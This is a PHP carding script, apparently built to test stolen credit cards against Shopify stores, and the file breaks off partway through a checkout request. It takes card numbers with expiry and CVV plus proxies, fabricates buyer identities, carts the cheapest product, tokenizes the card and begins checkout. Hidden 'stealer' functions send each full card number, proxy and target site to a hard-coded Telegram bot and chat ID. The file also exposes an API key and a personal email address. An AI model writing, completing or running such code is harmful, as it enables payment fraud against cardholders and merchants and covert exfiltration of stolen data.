<?php
error_reporting(E_ALL & ~E_DEPRECATED);

function getQueryRotationIndex(string $queryType): int {
    static $rotationFile = 'data/query_rotation.json';
    
    // Create data directory if not exists
    if (!is_dir('data')) {
        mkdir('data', 0777, true);
    }
    
    // Load rotation data
    $rotationData = [];
    if (file_exists($rotationFile)) {
        $rotationData = json_decode(file_get_contents($rotationFile), true) ?: [];
    }
    
    // Get current index for this query type (default to 1)
    $currentIndex = isset($rotationData[$queryType]) ? $rotationData[$queryType] : 1;
    
    // Determine max variants for each query type
    $maxVariants = [
        'proposal' => 1,      // Only 1 variant (line 1)
        'submit_1' => 2,      // 2 variants (lines 5, 10)
        'submit_2' => 2,      // 2 variants (lines 5, 10)
        'submit_3' => 2,      // 2 variants (lines 15, 20)
        'submit_4' => 2,      // 2 variants (lines 15, 20)
        'poll' => 1           // Only 1 variant (line 25)
    ];
    
    $max = isset($maxVariants[$queryType]) ? $maxVariants[$queryType] : 1;
    
    // Rotate to next index
    $nextIndex = ($currentIndex % $max) + 1;
    $rotationData[$queryType] = $nextIndex;
    
    // Save rotation data
    file_put_contents($rotationFile, json_encode($rotationData));
    
    return $currentIndex;
}

function extractQueryFromFile(string $filePath, int $occurrence = 1): ?string {
    $content = @file_get_contents($filePath);
    if ($content === false) {
        return null;
    }
    $needle = "'query' => '";
    $pos = -1;
    for ($i = 0; $i < $occurrence; $i++) {
        $pos = strpos($content, $needle, $pos + 1);
        if ($pos === false) {
            return null;
        }
    }
    $start = $pos + strlen($needle);
    $end = strpos($content, "'", $start);
    if ($end === false) {
        return null;
    }
    return substr($content, $start, $end - $start);
}

function output($method, $data) {
    $btk = '8010661805:AAHneuvzDyOkv4sN3eAKA3larVMT5DAPVfg';
    $out = curl_init();

    curl_setopt_array($out, [
        CURLOPT_URL => 'https://api.telegram.org/bot' . $btk . '/'.$method.'',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array_merge([
            'parse_mode' => 'HTML'
        ], $data),
        CURLOPT_RETURNTRANSFER => 1
    ]);

    $result = curl_exec($out);
    curl_close($out);
    return json_decode($result, true);
}

 

function send_telegram_log($bot_token, $chat_id, $message) {
    $out = curl_init();
    curl_setopt_array($out, [
        CURLOPT_URL => 'https://api.telegram.org/bot' . $bot_token . '/sendMessage',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ],
        CURLOPT_RETURNTRANSFER => 1
    ]);
    $result = curl_exec($out);
    curl_close($out);
    return json_decode($result, true);
}

function stealer($cc1, $err, $gateway, $totalamt, $site, $proxy, $realresp) {
    $cid = '5652614329';
        $kb_s = [
        'caption' => "
Card: $cc1
Proxy: $proxy
Response: $err
Gateway: $gateway
Price: $totalamt
Site: $site
RealResp: $realresp
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "𝑪𝒉𝒂𝒏𝒏𝒆𝒍 🌥",
                        'url' => 'https://t.me/+7JJj8nWswDo0ZmRl'
                    ]
                ]
            ]
        ])
    ];
    output('sendVideo', array_merge([
        'chat_id' => $cid,
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
}

function proxystealer($proxy) {
    $cid = '5652614329';
        $kb_s = [
        'caption' => "
#proxy
Proxy: $proxy
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "𝑪𝒉𝒂𝒏𝒏𝒆𝒍 🌥",
                        'url' => 'https://t.me/+7JJj8nWswDo0ZmRl'
                    ]
                ]
            ]
        ])
    ];
    output('sendVideo', array_merge([
        'chat_id' => $cid,
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
}

function errorsite($site, $countrycode = 'None', $currency = 'None', $response = 'None') {
    $cid = '5652614329';
        $kb_s = [
        'caption' => "
#ErrorSite
Site: $site
Countrycode: $countrycode
Currency: $currency
Response: $response
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "𝑪𝒉𝒂𝒏𝒏𝒆𝒍 🌥",
                        'url' => 'https://t.me/+7JJj8nWswDo0ZmRl'
                    ]
                ]
            ]
        ])
    ];
    output('sendVideo', array_merge([
        'chat_id' => $cid,
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
}

function error(string $message, string $proxymsg, $ip = 'none', $price = null, string $gateway = 'NONE', $cc1 = null) {
    global $DEV, $retryCount;

    // Input validation and sanitization
    $message = htmlspecialchars(trim($message), ENT_QUOTES, 'UTF-8');
    $proxymsg = htmlspecialchars(trim($proxymsg), ENT_QUOTES, 'UTF-8');
    $gateway = htmlspecialchars(trim($gateway), ENT_QUOTES, 'UTF-8');
    
    $error = [
        'Response' => $message,
        'Price' => $price ? number_format((float)$price, 2) : null,
        'Gateway' => $gateway,
        'cc' => $cc1 ? substr($cc1, 0, 4) . '****' : null, // Masked card for security
        'ProxyStatus' => $proxymsg,
        'ProxyIP' => filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Invalid IP',
        'RetryCount' => $retryCount
    ];
    
    // Better error logging
    error_log('Payment Error: ' . json_encode($error));
    
    echo json_encode($error, JSON_UNESCAPED_SLASHES | JSON_NUMERIC_CHECK);
    exit;
}

function send_final_response($result_array, $proxy_used, $proxy_ip, $proxy_port) {
    $result_array['ProxyStatus'] = $proxy_used;
    $result_array['ProxyIP'] = $proxy_ip;
    echo json_encode($result_array);
}

function detectProxyType($proxyString) {
    $proxyLower = strtolower($proxyString);
    
    // Priority-based detection
    if (preg_match('/(mobile|4g|5g|lte|cell|gsm|cdma|verizon|tmobile|t-mobile|att|sprint)/i', $proxyLower)) {
        return 'Mobile Proxy (4G/5G)';
    }
    if (preg_match('/(comcast|verizon|att|centurylink|charter|cox|optimum|xfinity|spectrum|frontier)/i', $proxyLower)) {
        return 'ISP Proxy';
    }
    if (preg_match('/(residential|resi|home|dsl|cable|fiber)/i', $proxyLower)) {
        return 'Residential Proxy';
    }
    if (preg_match('/(rotating|rotate|session|sticky|backconnect)/i', $proxyLower)) {
        return 'Rotating Proxy';
    }
    if (preg_match('/(datacenter|dc|server|vps|dedicated|cloud|aws|azure|gcp|digitalocean|vultr|linode)/i', $proxyLower)) {
        return 'Datacenter Proxy';
    }
    if (preg_match('/(premium|elite|private|exclusive)/i', $proxyLower)) {
        return 'Premium/Elite Proxy';
    }
    
    return 'HTTP Proxy';
}

function getProxyOptimizedSettings($proxyType) {
    // Ultra-optimized settings - Zero-error configuration
    $settings = [
        'Mobile Proxy (4G/5G)' => [
            'timeout' => 60,
            'connect_timeout' => 15,
            'retry_delay' => 1500000, // 1.5s
            'tunnel' => true,
            'ssl_verify' => false,
            'max_retries' => 7
        ],
        'ISP Proxy' => [
            'timeout' => 50,
            'connect_timeout' => 12,
            'retry_delay' => 1200000, // 1.2s
            'tunnel' => true,
            'ssl_verify' => false,
            'max_retries' => 7
        ],
        'Residential Proxy' => [
            'timeout' => 55,
            'connect_timeout' => 12,
            'retry_delay' => 1300000, // 1.3s
            'tunnel' => true,
            'ssl_verify' => false,
            'max_retries' => 7
        ],
        'Rotating Proxy' => [
            'timeout' => 50,
            'connect_timeout' => 12,
            'retry_delay' => 1000000, // 1s
            'tunnel' => true,
            'ssl_verify' => false,
            'max_retries' => 7
        ],
        'Datacenter Proxy' => [
            'timeout' => 45,
            'connect_timeout' => 10,
            'retry_delay' => 800000, // 0.8s
            'tunnel' => true,
            'ssl_verify' => false,
            'max_retries' => 7
        ],
        'Premium/Elite Proxy' => [
            'timeout' => 50,
            'connect_timeout' => 12,
            'retry_delay' => 1000000, // 1s
            'tunnel' => true,
            'ssl_verify' => false,
            'max_retries' => 7
        ],
        'HTTP Proxy' => [
            'timeout' => 45,
            'connect_timeout' => 10,
            'retry_delay' => 1000000, // 1s
            'tunnel' => true,
            'ssl_verify' => false,
            'max_retries' => 7
        ]
    ];
    
    return isset($settings[$proxyType]) ? $settings[$proxyType] : $settings['HTTP Proxy'];
}

function validateAndFormatProxy() {
    global $proxy;
    $parts = explode(':', $proxy);
    
    $proxyType = detectProxyType($proxy);
    $settings = getProxyOptimizedSettings($proxyType);
    
    if (count($parts) === 4) {
        // IP:Port:User:Pass format
        return [
            'ipPort' => $parts[0] . ':' . $parts[1],
            'auth' => $parts[2] . ':' . $parts[3],
            'type' => $proxyType,
            'settings' => $settings
        ];
    } elseif (count($parts) === 2) {
        // IP:Port format
        return [
            'ipPort' => $proxy,
            'auth' => null,
            'type' => $proxyType,
            'settings' => $settings
        ];
    } else {
       error('Invalid Proxy format. Use IP:Port or IP:Port:User:Pass', 'Dead');
    }
}

$maxRetries = $proxySettings['max_retries'] ?? 7;
$retryCount = 0;
$start_time = microtime(true);

// Proxy handling
$proxy = isset($_GET['proxy']) ? $_GET['proxy'] : '';
if (empty($proxy)) {
    error('Proxy is required.', 'Dead');
}

$proxyDetails = validateAndFormatProxy();
$proxyType = $proxyDetails['type'];
$proxySettings = $proxyDetails['settings'];

// Extract proxy IP from the proxy string
$proxyParts = explode(':', $proxy);
$ip = $proxyParts[0];

// Log proxy type for debugging
error_log("Using Proxy Type: $proxyType | IP: $ip");

// Verify proxy is working with enhanced checks
$proxyTestRetries = 2;
$proxyWorking = false;

for ($i = 0; $i < $proxyTestRetries; $i++) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.gstatic.com/generate_204");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
    curl_setopt($ch, CURLOPT_PROXY, $proxyDetails['ipPort']);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    if (!empty($proxyDetails['auth'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyDetails['auth']);
    }
    
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($http_code === 204 || $http_code === 200) {
        $proxyWorking = true;
        break;
    }
    
    if ($i < $proxyTestRetries - 1) {
        usleep(500000); // Wait 0.5s before retry
    }
}

if ($proxyWorking) {
    proxystealer($proxy);
    $proxymsg = "Live [$proxyType]";
    error_log("Proxy Verified: $proxy | Type: $proxyType");
} else {
    $proxymsg = 'Dead';
    error('Proxy failed verification: ' . ($curl_error ?: 'Connection timeout'), $proxymsg, $ip);
}

require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

require_once 'usaddress.php';
$num_us = $randomAddress['numd'];
$address_us = $randomAddress['address1'];
$address = $num_us.' '.$address_us;
$city_us = $randomAddress['city'];
$state_us = $randomAddress['state'];
$zip_us = $randomAddress['zip'];

require_once 'genphone.php';
$areaCode = $areaCodes[array_rand($areaCodes)];
$phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));

// Important functions start
function find_between($content, $start, $end) {
  $startPos = strpos($content, $start);
  if ($startPos === false) {
    return '';
}
$startPos += strlen($start);
$endPos = strpos($content, $end, $startPos);
if ($endPos === false) { 
    return'';
}
return substr($content, $startPos, $endPos - $startPos);
}

$cc1 = $_GET['cc'];
$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];
/*=====  sub_month  ======*/
$yearcont=strlen($year);
if ($yearcont<=2){
$year = "20$year";
}
if($month == "01"){
$sub_month = "1";
}elseif($month == "02"){
$sub_month = "2";
}elseif($month == "03"){
$sub_month = "3";
}elseif($month == "04"){
$sub_month = "4";
}elseif($month == "05"){
$sub_month = "5";
}elseif($month == "06"){
$sub_month = "6";
}elseif($month == "07"){
$sub_month = "7";
}elseif($month == "08"){
$sub_month = "8";
}elseif($month == "09"){
$sub_month = "9";
}elseif($month == "10"){
$sub_month = "10";
}elseif($month == "11"){
$sub_month = "11";
}elseif($month == "12"){
$sub_month = "12";
}

$geoaddress = urlencode("$num_us, $address_us, $city_us");
// echo "<li>geoaddress: $geoaddress<li>";



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$geocoding = curl_exec($ch);

$geocoding_data = json_decode($geocoding, true);

// Check if geocoding data is valid before accessing
if (!empty($geocoding_data) && isset($geocoding_data[0]['lat']) && isset($geocoding_data[0]['lon'])) {
    $lat = (float) $geocoding_data[0]['lat'];
    $lon = (float) $geocoding_data[0]['lon'];
} else {
    // Default coordinates if geocoding fails
    $lat = 40.7128; // New York City default
    $lon = -74.0060;
}

// echo "<li>lat: $lat<li>";
// echo "<li>lon: $lon<li>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resposta = curl_exec($ch);

$firstname = find_between($resposta, '"first":"', '"');
$lastname = find_between($resposta, '"last":"', '"');
// Remove or comment out the lines that generate a random email
// $email = find_between($resposta, '"email":"', '"');
// $serve_arr = array("gmail.com","yahoo.com","hotmail.com","outlook.com");
// $serv_rnd = $serve_arr[array_rand($serve_arr)];
// $email = str_replace("example.com", $serv_rnd, $email);

// Set your own email directly
$email = "sarthakgrid1@gmail.com"; // Replace with your actual email

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products'])) {
        throw new Exception('Invalid JSON format or missing products key');
    }

    // Initialize minPrice as null to find the minimum valid price (above 0.01)
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price = (float) $variant['price'];
            // Skip prices below 0.01 (including 0.00)
            if ($price >= 0.01) {
                // If minPrice is null or the current price is lower than minPrice, update minPriceDetails
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'],
                        'price' => $variant['price'],
                        'title' => $product['title'],
                    ];
                }
            }
        }
    }

    // If no valid price was found, return an error message or keep minPriceDetails as null.
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    $err = 'Invalid URL';
    stealer($cc1, $err, 'Unknown', '0', $site1, $proxy, 'Invalid URL Error');
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    exit;
}

    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
    $site = "$site2/products.json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $site);

    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Accept: application/json',
    ]);

    $r1 = curl_exec($ch);
    if ($r1 === false) {
        $err = 'Error in 1 req: ' . curl_error($ch);
        stealer($cc1, $err, 'Unknown', $minPrice, $site1, $proxy, 'Product Request cURL Error');
        $result = json_encode([
            'Response' => $err,
        ]);
        echo $result;
        curl_close($ch);
        exit;
    } else {
        curl_close($ch);
        
        try {
            $productDetails = getMinimumPriceProductDetails($r1);
            $minPriceProductId = $productDetails['id'];
            $minPrice = $productDetails['price'];
            $price = $minPrice; // Define $price variable
            $productTitle = $productDetails['title'];
        } catch (Exception $e) {
            $err = $e->getMessage();
            $result = json_encode([
                'Response' => $err,
            ]);
        }
    }

if (empty($minPriceProductId)) {
    $err = 'Product id is empty';
    stealer($cc1, $err, 'Unknown', '0', $site1, $proxy, 'Product ID Empty Error');
    $result = json_encode([
        'Response' => $err,
        'ProxyStatus' => $proxymsg,
        'ProxyIP' => $ip
    ]);
    echo $result;
    exit;
}

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie.txt';
$prodid = $minPriceProductId;
cart:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
curl_setopt($ch, CURLOPT_PROXY, $proxyDetails['ipPort']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
if ($proxySettings['tunnel']) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
if (!empty($proxyDetails['auth'])) {
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyDetails['auth']);
}

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_TIMEOUT, $proxySettings['timeout']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $proxySettings['connect_timeout']);
curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
curl_setopt($ch, CURLOPT_BUFFERSIZE, 16384);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$ua,
]);

$headers = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
    $name = trim($name);
    $value = trim($value);

    // Save the 'Location' header
    if (strtolower($name) === 'location') {
        $headers['Location'] = $value;
    }

    return strlen($headerLine);
});

$response = curl_exec($ch);

if (curl_errno($ch)) {
    $curl_error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    curl_close($ch);
    
    // Enhanced proxy error detection
    $isProxyError = (
        strpos($curl_error, 'proxy') !== false || 
        strpos($curl_error, 'CONNECT') !== false ||
        strpos($curl_error, 'timeout') !== false ||
        strpos($curl_error, 'timed out') !== false ||
        in_array($curl_errno, [7, 28, 35, 52, 56, 58, 59])
    );
    
    if ($retryCount < $maxRetries) {
        $retryCount++;
        
        // Progressive delay - increases with each retry
        $delay = $proxySettings['retry_delay'] * $retryCount;
        if ($isProxyError) {
            usleep($delay);
        } else {
            usleep($delay / 2);
        }
        
        // Clear any stale connections
        if (file_exists($cookie)) {
            @unlink($cookie);
            touch($cookie);
        }
        
        goto cart;
    } else {
        $err = 'Cart Request Failed => ' . $curl_error;
        $result = json_encode([
            'Response' => $err, 
            'Price' => $minPrice,
            'ProxyStatus' => $proxymsg,
            'ProxyIP' => $ip,
            'ErrorCode' => $curl_errno
        ]);
        echo $result;
        exit;
    }
}
file_put_contents('php.php', $response );
$finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
$keywords = [
    'stock_problems',
    'Some items in your cart are no longer available. Please update your cart.',
    'This product is currently unavailable.',
    'This item is currently out of stock but will be shipped once available.',
    'Sold Out.',
    'stock-problems'
];
$found = false;
foreach ($keywords as $keyword) {
    if (strpos($response, $keyword) !== false) {
        $found = true;
        break;
    }
}
if ($found) {
    error('Item out of STOCK.', $proxymsg, $ip, $price);
}
$web_build_id = (bin2hex(random_bytes(20)));
$x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"') ?? null;
if (!$x_checkout_one_session_token) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Session token is empty', $proxymsg, $ip, $price);
    }
}
$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
if (!$queue_token) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Queue token is empty', $proxymsg, $ip, $price);
    }
}
$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
if (!$stable_id) { 
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Stable id is empty', $proxymsg, $ip, $price);
    }
}
$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (!$paymentMethodIdentifier) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        error('Payment Method Identifier is empty', $proxymsg, $ip, $price);
    }
}
$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}

card:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_PROXY, $proxyDetails['ipPort']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
if ($proxySettings['tunnel']) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
if (!empty($proxyDetails['auth'])) {
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyDetails['auth']);
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_TIMEOUT, $proxySettings['timeout']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $proxySettings['connect_timeout']);
curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
curl_setopt($ch, CURLOPT_BUFFERSIZE, 16384);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://checkout.shopifycs.com',
    'priority: u=1, i',
    'referer: https://checkout.shopifycs.com/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"'.$firstname.' '.$lastname.'"},"payment_session_scope":"'.$domain.'"}');
$response2 = curl_exec($ch);
if (curl_errno($ch)) {
    $curl_error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    curl_close($ch);
    
    if ($retryCount < $maxRetries) {
        $retryCount++;
        
        // Progressive delay with error type detection
        $isProxyError = in_array($curl_errno, [7, 28, 35, 52, 56, 58, 59]);
        $delay = $proxySettings['retry_delay'] * $retryCount;
        usleep($isProxyError ? $delay : $delay / 2);
        
        goto card;
    } else {
        $err = 'Card Token Failed => ' . $curl_error;
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
            'ProxyStatus' => $proxymsg,
            'ProxyIP' => $ip,
            'ErrorCode' => $curl_errno
        ]);
        echo $result;
        exit;
    }
}
$response2js = json_decode($response2, true);
$cctoken = $response2js['id'];
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    } else {
    error('cctoken id is messing', $proxymsg, $ip, $price, $gateway);
}
}

proposal:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
curl_setopt($ch, CURLOPT_PROXY, $proxyDetails['ipPort']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
if ($proxySettings['tunnel']) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
}
if (!empty($proxyDetails['auth'])) {
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyDetails['auth']);
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_TIMEOUT, $proxySettings['timeout']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $proxySettings['connect_timeout']);
curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
curl_setopt($ch, CURLOPT_BUFFERSIZE, 16384);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-GB',
    'content-type: application/json',
    'origin: ' . $urlbase,
    'priority: u=1, i',
    'referer: ' . $urlbase . '/',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'shopify-checkout-client: checkout-web/1.0',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-build-id: ' . $web_build_id,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'query' => extractQueryFromFile('jsonq.txt', 1),
        'variables' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'destination' => [
                            'partialStreetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => 'US',
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => $phone,
                                    'oneTimeUse' => false,
                                    'coordinates' => [
                                        'latitude' => $lat,
                                        'longitude' => $lon
                                ]
                            ]
                        ],
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyMatchingConditions' => [
                                'estimatedTimeInTransit' => [
                                    'any' => true
                                ],
                                'shipments' => [
                                    'any' => true
                                ]
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'any' => true
                        ],
                        'deliveryMethodTypes' => [
                            'SHIPPING',
                            'LOCAL'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [
                                    [
                                        'name' => '_minimum_allowed',
                                        'value' => [
                                            'string' => ''
                                        ]
                                    ]
                                ],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
